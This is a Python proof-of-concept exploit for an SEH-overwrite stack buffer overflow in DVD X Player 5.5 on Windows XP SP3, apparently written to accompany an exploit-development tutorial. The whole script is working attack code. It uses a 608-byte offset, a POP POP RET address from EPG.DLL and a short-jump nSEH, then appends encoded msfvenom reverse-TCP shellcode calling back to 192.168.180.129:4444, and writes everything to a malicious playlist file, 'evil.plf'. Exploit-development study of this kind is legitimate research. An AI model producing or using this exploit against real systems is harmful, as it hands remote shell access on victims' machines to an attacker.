
# 
#   Author      : RIZAL MUHAMMED [UB3RSiCK]
#   Description : DVD x Player 5.5 Stack Buffer Overflow (SEH Overwrite) PoC 
#   Blogpost    : https://www.fuzzysecurity.com/tutorials/expDev/3.html
#   OS          : Windows XP SP3
#


import struct

def pack(a):
    return struct.pack('I', a)


# payload = pattern_create.rb 1000
# SEH record (nseh field) at 0x0012f5b8 overwritten with normal pattern : 0x33754132 (offset 608)

# [608 A] [nSEH] [SEH] [JUNK/SHELLCODE]
# Overwrite SEH with POP POP RET address
# nSEH with 4 Byte shellcode to do a short jump to shellcode

# POP POP RET - 0x6162B810
# EPG.DLL
SEH = 0x6162B810

#JMP SHORT 8
nSEH = "\xEB\x06\x90\x90"

#badchars = '\x00\x0A\x0D\x1A'

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.180.129 LPORT=4444 EXITFUNC=thread -f c -b '\x00\x0A\x0D\x1A' -e x86/shikata_ga_nai
shellcode = ("\xdd\xc7\xbf\x96\x90\x1e\xee\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x52\x83\xc5\x04\x31\x7d\x13\x03\xeb\x83\xfc\x1b\xef\x4c\x82"
"\xe4\x0f\x8d\xe3\x6d\xea\xbc\x23\x09\x7f\xee\x93\x59\x2d\x03"
"\x5f\x0f\xc5\x90\x2d\x98\xea\x11\x9b\xfe\xc5\xa2\xb0\xc3\x44"
"\x21\xcb\x17\xa6\x18\x04\x6a\xa7\x5d\x79\x87\xf5\x36\xf5\x3a"
"\xe9\x33\x43\x87\x82\x08\x45\x8f\x77\xd8\x64\xbe\x26\x52\x3f"
"\x60\xc9\xb7\x4b\x29\xd1\xd4\x76\xe3\x6a\x2e\x0c\xf2\xba\x7e"
"\xed\x59\x83\x4e\x1c\xa3\xc4\x69\xff\xd6\x3c\x8a\x82\xe0\xfb"
"\xf0\x58\x64\x1f\x52\x2a\xde\xfb\x62\xff\xb9\x88\x69\xb4\xce"
"\xd6\x6d\x4b\x02\x6d\x89\xc0\xa5\xa1\x1b\x92\x81\x65\x47\x40"
"\xab\x3c\x2d\x27\xd4\x5e\x8e\x98\x70\x15\x23\xcc\x08\x74\x2c"
"\x21\x21\x86\xac\x2d\x32\xf5\x9e\xf2\xe8\x91\x92\x7b\x37\x66"
"\xd4\x51\x8f\xf8\x2b\x5a\xf0\xd1\xef\x0e\xa0\x49\xd9\x2e\x2b"
"\x89\xe6\xfa\xfc\xd9\x48\x55\xbd\x89\x28\x05\x55\xc3\xa6\x7a"
"\x45\xec\x6c\x13\xec\x17\xe7\xdc\x59\xa3\x76\xb4\x9b\xcb\x69"
"\x19\x15\x2d\xe3\xb1\x73\xe6\x9c\x28\xde\x7c\x3c\xb4\xf4\xf9"
"\x7e\x3e\xfb\xfe\x31\xb7\x76\xec\xa6\x37\xcd\x4e\x60\x47\xfb"
"\xe6\xee\xda\x60\xf6\x79\xc7\x3e\xa1\x2e\x39\x37\x27\xc3\x60"
"\xe1\x55\x1e\xf4\xca\xdd\xc5\xc5\xd5\xdc\x88\x72\xf2\xce\x54"
"\x7a\xbe\xba\x08\x2d\x68\x14\xef\x87\xda\xce\xb9\x74\xb5\x86"
"\x3c\xb7\x06\xd0\x40\x92\xf0\x3c\xf0\x4b\x45\x43\x3d\x1c\x41"
"\x3c\x23\xbc\xae\x97\xe7\xdc\x4c\x3d\x12\x75\xc9\xd4\x9f\x18"
"\xea\x03\xe3\x24\x69\xa1\x9c\xd2\x71\xc0\x99\x9f\x35\x39\xd0"
"\xb0\xd3\x3d\x47\xb0\xf1")
nops = "\x90"

payload = 'A'*608 + nSEH + pack(SEH) + nops*16 + shellcode

with open('evil.plf', 'w') as ff:
    ff.write(payload)
    ff.close()




